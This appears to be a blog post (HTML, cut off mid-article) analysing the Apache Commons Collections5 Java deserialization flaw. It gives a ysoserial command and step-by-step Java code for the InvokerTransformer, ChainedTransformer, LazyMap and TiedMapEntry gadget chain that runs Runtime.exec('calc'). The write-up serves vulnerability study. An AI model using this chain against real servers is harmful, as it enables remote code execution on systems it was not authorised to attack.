@@ -1,0 +1,649 @@
+<!DOCTYPE html>
+<html lang="zh-CN">
+    <head>
+        <meta charset="utf-8">
+        <meta name="viewport" content="width=device-width, initial-scale=1">
+        <meta name="robots" content="noodp" />
+        <meta http-equiv="X-UA-Compatible" content="IE=edge, chrome=1">
+        <title>Apache Commons Collections5 反序列化漏洞分析 - Da22le的博客</title><meta name="Description" content="好好学习 天天向上"><meta property="og:title" content="Apache Commons Collections5 反序列化漏洞分析" />
+<meta property="og:description" content="前言 Apache Commons Collections的漏洞最初在2015年11月6日由FoxGlove Security安全团队的@breenmachine 在一篇长" />
+<meta property="og:type" content="article" />
+<meta property="og:url" content="/apache-commons-collections5/" /><meta property="og:image" content="/logo.png"/><meta property="article:section" content="posts" />
+<meta property="article:published_time" content="2021-12-20T16:38:25+08:00" />
+<meta property="article:modified_time" content="2021-12-20T16:38:25+08:00" />
+
+<meta name="twitter:card" content="summary_large_image"/>
+<meta name="twitter:image" content="/logo.png"/>
+
+<meta name="twitter:title" content="Apache Commons Collections5 反序列化漏洞分析"/>
+<meta name="twitter:description" content="前言 Apache Commons Collections的漏洞最初在2015年11月6日由FoxGlove Security安全团队的@breenmachine 在一篇长"/>
+<meta name="application-name" content="LoveIt">
+<meta name="apple-mobile-web-app-title" content="LoveIt"><meta name="theme-color" content="#ffffff"><meta name="msapplication-TileColor" content="#da532c"><link rel="shortcut icon" type="image/x-icon" href="/favicon.ico" />
+        <link rel="icon" type="image/png" sizes="32x32" href="/favicon-32x32.png">
+        <link rel="icon" type="image/png" sizes="16x16" href="/favicon-16x16.png"><link rel="apple-touch-icon" sizes="180x180" href="/apple-touch-icon.png"><link rel="mask-icon" href="/safari-pinned-tab.svg" color="#5bbad5"><link rel="manifest" href="/site.webmanifest"><link rel="canonical" href="/apache-commons-collections5/" /><link rel="prev" href="/cve-2021-32682-elfinder-rce/" /><link rel="next" href="/cve-2021-38294-apache-storm-nimbus-rce/" /><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/normalize.css@8.0.1/normalize.min.css"><link rel="stylesheet" href="/css/style.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.13.0/css/all.min.css"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/animate.css@3.7.2/animate.min.css"><script type="application/ld+json">
+    {
+        "@context": "http://schema.org",
+        "@type": "BlogPosting",
+        "headline": "Apache Commons Collections5 反序列化漏洞分析",
+        "inLanguage": "zh-CN",
+        "mainEntityOfPage": {
+            "@type": "WebPage",
+            "@id": "\/apache-commons-collections5\/"
+        },"image": ["\/images\/Apple-Devices-Preview.png"],"genre": "posts","wordcount":  2434 ,
+        "url": "\/apache-commons-collections5\/","datePublished": "2021-12-20T16:38:25+08:00","dateModified": "2021-12-20T16:38:25+08:00","license": "This work is licensed under a Creative Commons Attribution-NonCommercial 4.0 International License.","publisher": {
+            "@type": "Organization",
+            "name": "Da22le","logo": "\/images\/avatar.png"},"author": {
+                "@type": "Person",
+                "name": "Da22le"
+            },"description": ""
+    }
+    </script></head>
+    <body header-desktop="fixed" header-mobile="auto"><script type="text/javascript">(window.localStorage && localStorage.getItem('theme') ? localStorage.getItem('theme') === 'dark' : ('auto' === 'auto' ? window.matchMedia('(prefers-color-scheme: dark)').matches : 'auto' === 'dark')) && document.body.setAttribute('theme', 'dark');</script>
+
+        <div id="mask"></div><div class="wrapper"><header class="desktop" id="header-desktop">
+    <div class="header-wrapper">
+        <div class="header-title">
+            <a href="/" title="Da22le的博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Da22le</a>
+        </div>
+        <div class="menu">
+            <div class="menu-inner"><a class="menu-item" href="/posts/"> 所有文章 </a><a class="menu-item" href="/about/"> 关于 </a><a class="menu-item" href="/https:/github.com/Da22le" title="GitHub"><i class='fab fa-github fa-fw'></i>  </a><span class="menu-item delimiter"></span><span class="menu-item search" id="search-desktop">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-desktop">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-desktop" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-desktop" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-desktop">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </span><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                    <i class="fas fa-adjust fa-fw"></i>
+                </a>
+            </div>
+        </div>
+    </div>
+</header><header class="mobile" id="header-mobile">
+    <div class="header-container">
+        <div class="header-wrapper">
+            <div class="header-title">
+                <a href="/" title="Da22le的博客"><span class="header-title-pre"><i class='far fa-kiss-wink-heart fa-fw'></i></span>Da22le</a>
+            </div>
+            <div class="menu-toggle" id="menu-toggle-mobile">
+                <span></span><span></span><span></span>
+            </div>
+        </div>
+        <div class="menu" id="menu-mobile"><div class="search-wrapper">
+                    <div class="search mobile" id="search-mobile">
+                        <input type="text" placeholder="搜索文章标题或内容..." id="search-input-mobile">
+                        <a href="javascript:void(0);" class="search-button search-toggle" id="search-toggle-mobile" title="搜索">
+                            <i class="fas fa-search fa-fw"></i>
+                        </a>
+                        <a href="javascript:void(0);" class="search-button search-clear" id="search-clear-mobile" title="清空">
+                            <i class="fas fa-times-circle fa-fw"></i>
+                        </a>
+                        <span class="search-button search-loading" id="search-loading-mobile">
+                            <i class="fas fa-spinner fa-fw fa-spin"></i>
+                        </span>
+                    </div>
+                    <a href="javascript:void(0);" class="search-cancel" id="search-cancel-mobile">
+                        取消
+                    </a>
+                </div><a class="menu-item" href="/posts/" title="">所有文章</a><a class="menu-item" href="/about/" title="">关于</a><a class="menu-item" href="/https:/github.com/Da22le" title="GitHub"><i class='fab fa-github fa-fw'></i></a><a href="javascript:void(0);" class="menu-item theme-switch" title="切换主题">
+                <i class="fas fa-adjust fa-fw"></i>
+            </a></div>
+    </div>
+</header>
+<div class="search-dropdown desktop">
+    <div id="search-dropdown-desktop"></div>
+</div>
+<div class="search-dropdown mobile">
+    <div id="search-dropdown-mobile"></div>
+</div>
+<main class="main">
+                <div class="container"><div class="toc" id="toc-auto">
+            <h2 class="toc-title">目录</h2>
+            <div class="toc-content" id="toc-content-auto"></div>
+        </div><article class="page single"><h1 class="single-title animated flipInX">Apache Commons Collections5 反序列化漏洞分析</h1><div class="post-meta">
+            <div class="post-meta-line"><span class="post-author"><a href="/" title="Author" rel=" author" class="author"><i class="fas fa-user-circle fa-fw"></i>Da22le</a></span></div>
+            <div class="post-meta-line"><i class="far fa-calendar-alt fa-fw"></i>&nbsp;<time datetime="2021-12-20">2021-12-20</time>&nbsp;<i class="fas fa-pencil-alt fa-fw"></i>&nbsp;约 2434 字&nbsp;
+                <i class="far fa-clock fa-fw"></i>&nbsp;预计阅读 5 分钟&nbsp;<span id="/apache-commons-collections5/" class="leancloud_visitors" data-flag-title="Apache Commons Collections5 反序列化漏洞分析">
+                        <i class="far fa-eye fa-fw"></i>&nbsp;<span class=leancloud-visitors-count></span>&nbsp;次阅读
+                    </span>&nbsp;</div>
+        </div><div class="details toc" id="toc-static"  kept="">
+                <div class="details-summary toc-title">
+                    <span>目录</span>
+                    <span><i class="details-icon fas fa-angle-right"></i></span>
+                </div>
+                <div class="details-content toc-content" id="toc-content-static"><nav id="TableOfContents">
+  <ul>
+    <li><a href="#前言">前言</a></li>
+    <li><a href="#影响版本">影响版本</a></li>
+    <li><a href="#环境搭建">环境搭建</a></li>
+    <li><a href="#漏洞复现">漏洞复现</a></li>
+    <li><a href="#漏洞分析">漏洞分析</a></li>
+    <li><a href="#参考链接">参考链接</a></li>
+  </ul>
+</nav></div>
+            </div><div class="content" id="content"><h1 id="前言">前言</h1>
+<p>Apache Commons Collections的漏洞最初在2015年11月6日由FoxGlove Security安全团队的@breenmachine 在一篇长博客上阐述，危害面覆盖了大部分的Web中间件，影响十分深远。</p>
+<h1 id="影响版本">影响版本</h1>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">Apache Commons Collections &lt;= 3.2.1，&lt;= 4.0.0
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="环境搭建">环境搭建</h1>
+<p>使用idea创建一个maven项目，在pom.xml文件中加入commons-collections依赖。</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">&lt;?xml version=&#34;1.0&#34; encoding=&#34;UTF-8&#34;?&gt;
+&lt;project xmlns=&#34;http://maven.apache.org/POM/4.0.0&#34;
+         xmlns:xsi=&#34;http://www.w3.org/2001/XMLSchema-instance&#34;
+         xsi:schemaLocation=&#34;http://maven.apache.org/POM/4.0.0 http://maven.apache.org/xsd/maven-4.0.0.xsd&#34;&gt;
+    &lt;modelVersion&gt;4.0.0&lt;/modelVersion&gt;
+
+    &lt;groupId&gt;org.example&lt;/groupId&gt;
+    &lt;artifactId&gt;ysoserialPayload&lt;/artifactId&gt;
+    &lt;version&gt;1.0-SNAPSHOT&lt;/version&gt;
+    &lt;dependencies&gt;
+        &lt;dependency&gt;
+            &lt;groupId&gt;commons-collections&lt;/groupId&gt;
+            &lt;artifactId&gt;commons-collections&lt;/artifactId&gt;
+            &lt;version&gt;3.1&lt;/version&gt;
+        &lt;/dependency&gt;
+    &lt;/dependencies&gt;
+
+&lt;/project&gt;
+</code></pre></td></tr></table>
+</div>
+</div><blockquote>
+<p>在这里commons-collections组件没有3.1版本，idea无法自动引入，需要手动添加</p>
+</blockquote>
+<p>创建一个java文件，包含有序列化和反序列化方法</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span><span class="lnt">26
+</span><span class="lnt">27
+</span><span class="lnt">28
+</span><span class="lnt">29
+</span><span class="lnt">30
+</span><span class="lnt">31
+</span><span class="lnt">32
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">payload</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">FileInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">FileOutputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ObjectInputStream</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">java</span><span class="p">.</span><span class="nx">io</span><span class="p">.</span><span class="nx">ObjectOutputStream</span><span class="p">;</span>
+
+<span class="nx">public</span> <span class="nx">class</span> <span class="nx">CommonsCollections5</span> <span class="p">{</span>
+    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nf">deserialize</span><span class="p">();</span>
+    <span class="p">}</span>
+
+    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">serialize</span><span class="p">(</span><span class="nx">Object</span> <span class="nx">obj</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">try</span> <span class="p">{</span>
+            <span class="nx">ObjectOutputStream</span> <span class="nx">os</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectOutputStream</span><span class="p">(</span><span class="nx">new</span> <span class="nf">FileOutputStream</span><span class="p">(</span><span class="s">&#34;test.ser&#34;</span><span class="p">));</span>
+            <span class="nx">os</span><span class="p">.</span><span class="nf">writeObject</span><span class="p">(</span><span class="nx">obj</span><span class="p">);</span>
+            <span class="nx">os</span><span class="p">.</span><span class="nb">close</span><span class="p">();</span>
+        <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">deserialize</span><span class="p">()</span> <span class="p">{</span>
+        <span class="nx">try</span> <span class="p">{</span>
+            <span class="nx">ObjectInputStream</span> <span class="nx">is</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ObjectInputStream</span><span class="p">(</span><span class="nx">new</span> <span class="nf">FileInputStream</span><span class="p">(</span><span class="s">&#34;test.ser&#34;</span><span class="p">));</span>
+            <span class="nx">is</span><span class="p">.</span><span class="nf">readObject</span><span class="p">();</span>
+        <span class="p">}</span> <span class="nf">catch</span> <span class="p">(</span><span class="nx">Exception</span> <span class="nx">e</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">e</span><span class="p">.</span><span class="nf">printStackTrace</span><span class="p">();</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><h1 id="漏洞复现">漏洞复现</h1>
+<p>在这里使用<code>ysoserial</code>工具生成payload，然后运行我们创建的java文件达成命令执行的效果</p>
+<p><code>java -jar ysoserial-master-30099844c6-1.jar CommonsCollections5 calc &gt; test.ser</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0be64ae8-5c69-7989-4ec3-e1babdd1bba1.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0be64ae8-5c69-7989-4ec3-e1babdd1bba1.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0be64ae8-5c69-7989-4ec3-e1babdd1bba1.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0be64ae8-5c69-7989-4ec3-e1babdd1bba1.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0be64ae8-5c69-7989-4ec3-e1babdd1bba1.png"
+        title="1.png" /></p>
+<h1 id="漏洞分析">漏洞分析</h1>
+<p>漏洞出现在<code>org.apache.commons.collections.functors.InvokerTransformer#transform</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/386b4511-a9b7-8418-fe65-a604ad0934d8.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/386b4511-a9b7-8418-fe65-a604ad0934d8.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/386b4511-a9b7-8418-fe65-a604ad0934d8.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/386b4511-a9b7-8418-fe65-a604ad0934d8.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/386b4511-a9b7-8418-fe65-a604ad0934d8.png"
+        title="2.png" /></p>
+<p>该类继承了<code>Transformer</code>和<code>Serializable</code>接口，然后可以看出下面使用反射方法，而其中的<code>this.iMethodName</code>、<code>this.iParamTypes</code>和<code>this.iArgs</code>变量可控，导致可以用反射去调用<code>Runtime.getRuntime().exec(cmd)</code>执行系统命令。</p>
+<p>构造如下代码，去控制变量尝试弹出计算器</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">payload</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">InvokerTransformer</span><span class="p">;</span>
+
+<span class="nx">public</span> <span class="nx">class</span> <span class="nx">CommonsCollections5</span> <span class="p">{</span>
+    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">){</span>
+        <span class="nx">InvokerTransformer</span> <span class="nx">invokerTransformer</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span>
+                <span class="s">&#34;exec&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">String</span><span class="p">[]{</span><span class="s">&#34;calc&#34;</span><span class="p">}</span>
+        <span class="p">);</span>
+        <span class="nx">invokerTransformer</span><span class="p">.</span><span class="nf">transform</span><span class="p">(</span><span class="nx">Runtime</span><span class="p">.</span><span class="nf">getRuntime</span><span class="p">());</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0319ab36-9048-dc91-36b4-06520c3ee787.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0319ab36-9048-dc91-36b4-06520c3ee787.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0319ab36-9048-dc91-36b4-06520c3ee787.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0319ab36-9048-dc91-36b4-06520c3ee787.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0319ab36-9048-dc91-36b4-06520c3ee787.png"
+        title="3.png" /></p>
+<p>我们知道在执行反序列化操作时，会自动执行<code>readObject</code>函数，如果直接序列化上面的<code>InvokerTransformer</code>对象，那么在<code>readObject</code>之后还需要主动调用<code>transform(Runtime.getRuntime())</code>，这显然是不实际的，因为无法自动创建<code>transform</code>对象，因此我们接下来需要解决两个问题：</p>
+<ol>
+<li>自动执行<code>Runtime.getRuntime()</code></li>
+<li>自动执行<code>invokerTransformer.transform()</code></li>
+</ol>
+<p>其中第一个问题的解决方案在<code>org.apache.commons.collections.functors.ChainedTransformer#transform</code>中可以解决</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0fadf7dc-7671-a942-ec00-8bb4cd3f77cb.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0fadf7dc-7671-a942-ec00-8bb4cd3f77cb.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0fadf7dc-7671-a942-ec00-8bb4cd3f77cb.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0fadf7dc-7671-a942-ec00-8bb4cd3f77cb.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/0fadf7dc-7671-a942-ec00-8bb4cd3f77cb.png"
+        title="4.png" /></p>
+<p>该类也继承了<code>Transformer</code>和<code>Serializable</code>接口，我们可以定义一个<code>Transformer</code>数组，里面放入多个<code>InvokerTransformer</code>经过多次反射调用来实现自动执行<code>Runtime.getRuntime()</code></p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span><span class="lnt">20
+</span><span class="lnt">21
+</span><span class="lnt">22
+</span><span class="lnt">23
+</span><span class="lnt">24
+</span><span class="lnt">25
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-go" data-lang="go"><span class="kn">package</span> <span class="nx">payload</span><span class="p">;</span>
+
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">InvokerTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">Transformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">ChainedTransformer</span><span class="p">;</span>
+<span class="kn">import</span> <span class="nx">org</span><span class="p">.</span><span class="nx">apache</span><span class="p">.</span><span class="nx">commons</span><span class="p">.</span><span class="nx">collections</span><span class="p">.</span><span class="nx">functors</span><span class="p">.</span><span class="nx">ConstantTransformer</span><span class="p">;</span>
+
+<span class="nx">class</span> <span class="nx">CommonsCollections5</span> <span class="p">{</span>
+
+    <span class="nx">public</span> <span class="nx">static</span> <span class="nx">void</span> <span class="nf">main</span><span class="p">(</span><span class="nx">String</span><span class="p">[]</span> <span class="nx">args</span><span class="p">)</span> <span class="nx">throws</span> <span class="nx">Exception</span> <span class="p">{</span>
+<span class="c1">//        ((Runtime) Runtime.class.getMethod(&#34;getRuntime&#34;).invoke(null)).exec(&#34;calc&#34;);
+</span><span class="c1"></span>        <span class="nx">Transformer</span><span class="p">[]</span> <span class="nx">transformers</span> <span class="p">=</span> <span class="nx">new</span> <span class="nx">Transformer</span><span class="p">[]{</span>
+                <span class="c1">// 传入Runtime类
+</span><span class="c1"></span>                <span class="nx">new</span> <span class="nf">ConstantTransformer</span><span class="p">(</span><span class="nx">Runtime</span><span class="p">.</span><span class="nx">class</span><span class="p">),</span>
+                <span class="c1">// 使用Runtime.class.getMethod()反射调用Runtime.getRuntime()
+</span><span class="c1"></span>                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;getMethod&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Class</span><span class="p">[].</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]{</span><span class="s">&#34;getRuntime&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[</span><span class="mi">0</span><span class="p">]}),</span>
+                <span class="c1">// invoke()调用Runtime.class.getMethod(&#34;getRuntime&#34;).invoke(null)
+</span><span class="c1"></span>                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;invoke&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">Object</span><span class="p">.</span><span class="nx">class</span><span class="p">,</span> <span class="nx">Object</span><span class="p">[].</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[]{</span><span class="nx">null</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Object</span><span class="p">[</span><span class="mi">0</span><span class="p">]}),</span>
+                <span class="c1">// 调用exec(&#34;calc&#34;)
+</span><span class="c1"></span>                <span class="nx">new</span> <span class="nf">InvokerTransformer</span><span class="p">(</span><span class="s">&#34;exec&#34;</span><span class="p">,</span> <span class="nx">new</span> <span class="nx">Class</span><span class="p">[]{</span><span class="nx">String</span><span class="p">.</span><span class="nx">class</span><span class="p">},</span> <span class="nx">new</span> <span class="nx">String</span><span class="p">[]{</span><span class="s">&#34;calc&#34;</span><span class="p">})</span>
+        <span class="p">};</span>
+        <span class="nx">ChainedTransformer</span> <span class="nx">chain</span> <span class="p">=</span> <span class="nx">new</span> <span class="nf">ChainedTransformer</span><span class="p">(</span><span class="nx">transformers</span><span class="p">);</span>
+        <span class="nx">chain</span><span class="p">.</span><span class="nf">transform</span><span class="p">(</span><span class="nx">null</span><span class="p">);</span>
+    <span class="p">}</span>
+<span class="p">}</span>
+</code></pre></td></tr></table>
+</div>
+</div><p>接下来第二个问题，解决思路为全局搜索那个类会去调用<code>transform()</code>，然后继续搜索该类中调用<code>transform()</code>的方法可以被其它的类调用，直到其被重写的<code>readObject()</code>调用。</p>
+<p>其中在<code>org.apache.commons.collections.map.LazyMap#get</code>调用了<code>transform()</code></p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/213764ab-aa13-867f-0704-88befc099b74.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/213764ab-aa13-867f-0704-88befc099b74.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/213764ab-aa13-867f-0704-88befc099b74.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/213764ab-aa13-867f-0704-88befc099b74.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/213764ab-aa13-867f-0704-88befc099b74.png"
+        title="5.png" /></p>
+<p>可以构造出以下代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-fallback" data-lang="fallback">HashMap hashMap = new HashMap();
+Map map = LazyMap.decorate(hashMap, chain);
+map.get(&#34;test&#34;);	//map.get() &gt; transform()
+</code></pre></td></tr></table>
+</div>
+</div><p>接下来在<code>org.apache.commons.collections.keyvalue.TiedMapEntry#getValue</code>中调用了<code>LazyMap</code>的<code>get()</code>方法</p>
+<p><img
+        class="lazyload"
+        src="/svg/loading.min.svg"
+        data-src="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8c054e5e-edc2-18f4-f1e8-5c0d9de05da3.png"
+        data-srcset="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8c054e5e-edc2-18f4-f1e8-5c0d9de05da3.png, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8c054e5e-edc2-18f4-f1e8-5c0d9de05da3.png 1.5x, https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8c054e5e-edc2-18f4-f1e8-5c0d9de05da3.png 2x"
+        data-sizes="auto"
+        alt="https://qiita-image-store.s3.ap-northeast-1.amazonaws.com/0/2513662/8c054e5e-edc2-18f4-f1e8-5c0d9de05da3.png"
+        title="6.png" /></p>
+<p>其中<code>getValue()</code>调用了<code>map.get()</code>方法，而<code>toString()</code>调用了<code>this.getValue()</code>，而其中<code>this.key</code>可控</p>
+<p>可以构造出以下代码</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
